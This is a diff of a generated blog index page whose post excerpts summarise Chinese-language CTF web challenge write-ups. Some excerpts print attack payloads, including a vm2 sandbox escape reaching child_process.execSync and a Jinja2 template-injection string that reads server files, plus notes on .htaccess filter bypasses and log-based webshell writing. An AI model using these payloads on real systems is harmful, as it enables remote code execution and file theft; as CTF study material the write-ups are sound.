@@ -141,6 +141,270 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/17/%5BHFCTF2020%5DJustEscape/">
+        <p class="h4 index-header">[HFCTF2020]JustEscape</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[HFCTF2020]JustEscape最近老遇到js的题目，表示完全不会。
+看网上的wp，是基于node.js的网站，如输入Error().stack 即可报错（同时发现VM沙箱机制）。
+这是网上的payload：
+&quot;use strict&quot;;const {VM} = require(&#39;vm2&#39;);const untrusted = &#39;(&#39; + function(){
+    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();
+    try{
+        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;
+    }catch(e){
+        return e.get_process(()=&gt;{}).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-17&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/13/%5BXNUCA2019Qualifier%5DEasyPHP/">
+        <p class="h4 index-header">[XNUCA2019Qualifier]EasyPHP</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[XNUCA2019Qualifier]EasyPHP
+解法一
+[1、error_log结合log_errors自定义错误日志]
+[2、include_path设置包含路径]
+[3、php_value zend.multibyte 1结合php_value zend.script_encoding “UTF-7”绕过尖括号&lt;过滤]
+[4、# \ 绕过.htaccess中多余字符]
+
+
+解法二
+[5、.htaccess配置prce绕过正则匹配]
+
+
+[解法三]
+
+</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-13&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/06/%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web5%5DCyberPunk/">
+        <p class="h4 index-header">[CISCN2019 华北赛区 Day1 Web5]CyberPunk</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[CISCN2019 华北赛区 Day1 Web5]CyberPunk
+发现敏感信息。
+利用PHP伪协议读取源码
+index.php：
+&lt;?php
+
+ini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);
+
+// $file = $_GET[&quot;file&quot;];
+$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);
+if (isset($file)){
+    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {
+        echo(&#39;no way!&#39;);
+        exit;
+    }
+    @include($file);
+}
+?&gt;
+这里的正则因为是/i对大小写不敏感所以我没办法绕过。
+search.php
+&lt;?php
+
+require_once &quot;config.p</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-06&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/05/%5BMRCTF2020%5DPYWebsite/">
+        <p class="h4 index-header">[MRCTF2020]PYWebsite</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[MRCTF2020]PYWebsiteF12发现了
+
+/js/md5.js
+
+
+
+
+function enc(code){
+
+
+
+
+
+hash = hex_md5(code);
+
+
+
+return hash;
+
+
+
+}
+
+
+
+function validate(){
+
+
+
+var code = document.getElementById(“vcode”).value;
+
+
+
+if (code != “”){
+
+
+
+if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d655c”){
+
+
+
+alert(“您通过了验证！”);
+
+
+
+window.location = “./flag.php”
+
+
+
+}else{
+
+
+
+alert(“你的授权码不正确！”);
+
+
+
+}
+
+
+
+}else{
+
+
+
+alert(“请输入授权码”);
+
+
+
+}
+
+
+
+
+
+
+
+}
+
+
+说输入code与某值进行比较，相等就出现flag。所以现在就是分析加密函数。
+
+ if(hex_md5(code) == “0cd4da0223c0b280829dc3ea458d65</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-05&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/05/03/%5BGYCTF2020%5DFlaskApp/">
+        <p class="h4 index-header">[GYCTF2020]FlaskApp</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">[GYCTF2020]FlaskApp在提示页面f12发现了一段神奇的cookie
+
+eyJjc3JmX3Rva2VuIjoiOTAzM2UwYTY2YzhhOTM3N2NjYmNlMTIwNDcyZmZkYWVhMTg3YTljNyJ9.Xq5hWQ.wd9G8fR8lwO4P_W-GS9Dxbp70kQ
+
+在网站的解密页面解密一下。突然就跳转到了一个神奇的页面
+
+发现这是WSGI
+在加密界面输入12，解密解密成功回显12
+这里有个脚本
+
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% endif %}{% endfor %}
+> ```
+
+![image-20200503183556194](C:\Users\ykpc\AppData\Roaming\Typora\typora-user-images\</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-05-03&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/05/02/%5BFBCTF2019%5DRCEService/">
         <p class="h4 index-header">[FBCTF2019]RCEService</p>
         
@@ -354,171 +618,11 @@ if(isset($_GET[&#39;source&#39;]))
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/20/Apache%20SSI%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
-        <p class="h4 index-header">Apache SSI 远程命令执行漏洞</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">Apache SSI 远程命令执行漏洞链接：
-https://www.cnblogs.com/yuzly/p/11226439.html
-当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用语法执行命令。
-使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。
-</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-20&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/19/%5BSUCTF%202019%5DEasyWeb/">
-        <p class="h4 index-header">[SUCTF 2019]EasyWeb</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">[SUCTF 2019]EasyWeb题目源码
-&lt;?php
-function get_the_flag(){
-    // webadmin will remove your upload file every 20 min!!!! 
-    $userdir = &quot;upload/tmp_&quot;.md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
-    if(!file_exists($userdir)){
-    mkdir($userdir);
-    }
-    if(!empty($_FILES[&quot;file&quot;])){
-        $tmp_name = $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];
-        $name = $_FILES[&quot;file&quot;][&quot;name&quot;];
-        $extension = substr($name, strrpos($name,&quot;.&quot;)+1);
-  </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-19&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/14/%5BGWCTF%202019%5D%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">
-        <p class="h4 index-header">[GWCTF 2019]我有一个数据库</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">[GWCTF 2019]我有一个数据库打开网页，查看网页源码，发现什么都没有。进行目录扫描，发现了：phpmyadmin ，phpinfo.php。
-打开phpmyadmin，直接登录了不需要密码，猜测应该是提权。
-提权说道写shell不得不说 MYSQL secure_file_priv对读写文件的影响。首先我们先查看这个参数的值
-SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;返回参数为NULL。
-secure_file_priv的值为null ，表示限制mysql不允许导入|导出
-
-当secure_file_priv的值为/tmp/ ，表示限制mysql的导入|导出只能发生在/tmp/目录下
-
-当secure_file_priv的值没有具体值时，表示不对mysql的导入|导出做限制这个时候就可以利用(general_log、general_log file)日志文件getshell，general_log就是记录输入的日志文件，general_log file就是规定日志保存在哪个路径，我们只要输入一句话然后保存网站目录下的php</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-14&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/09/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/">
-        <p class="h4 index-header">python反序列化漏洞浅析</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">0x01 前言数据序列化常见的应用场景：数据结构网络传输，session存储，cache存储，或者配置文件上传，参数接收等接口处。
-主要作用：能够让数据在存储或者传输的时候能够单单只用string的类型去表述相对复杂的数据结构，方便应用所见即所得，直接进行数据交流处理。
-引发的安全问题：PHP的unserialize/__wakeup()漏洞、struts的ognl、xml解析的一系列漏洞、Ruby on Rails的xml/yaml，本文即将要讲的Python pickle/cPickle库的反序列化漏洞
-此类漏洞常会导致RCE，原因：和我们所提到的应用场景有关。语言需要从string去解析出自己的语言数据结构，必然要去从这个string中做固定格式的解析，然后在内部把解析出来的结果去eval一下；或者，为了保证解析出来的内容为被序列化时候的Object状态，要调用一下状态保存的函数wakeup
-0x02 Pickle模块
-pickle模块用来对Python对象执行序列化和反序列化。Python的任何对象都可以通过它永久保存到硬盘文件。Pickle实际上是先把Python对象（lis</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-09&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2020/04/06/Javaweb%E5%88%A9%E7%94%A8/">
-        <p class="h4 index-header">WEB-INF</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">WEB-INF主要通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码[https://buuoj.cn/challenges#[RoarCTF%202019\]Easy%20Java](https://buuoj.cn/challenges#[RoarCTF 2019]Easy Java)首先看到一个页面,点击下help看看啥情况。
-发现输出一串
-java.io.FileNotFoundException:{help.docx}可能是报错信息，打开Brup截取请求信息
-GET /Download?filename=help.docx HTTP/1.1
-Host: a6360be7-edf9-4caa-9461-3f2c7a89df9e.node3.buuoj.cn
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
-Accept: text/html,application/xhtml+xm</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2020-04-06&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
+      <a class="extend prev" rel="prev" href="/"><i class="fas fa-angle-double-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
